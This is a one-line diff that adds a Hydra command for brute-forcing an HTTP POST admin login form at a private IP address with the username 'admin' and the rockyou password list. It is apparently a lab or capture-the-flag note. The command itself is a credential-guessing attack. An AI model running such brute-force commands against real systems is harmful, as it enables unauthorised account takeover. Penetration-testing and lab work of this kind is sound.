@@ -1,0 +1,2 @@
+
+hydra -l admin -P /rockyou.txt 10.10.10.10 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -V -I -t 4
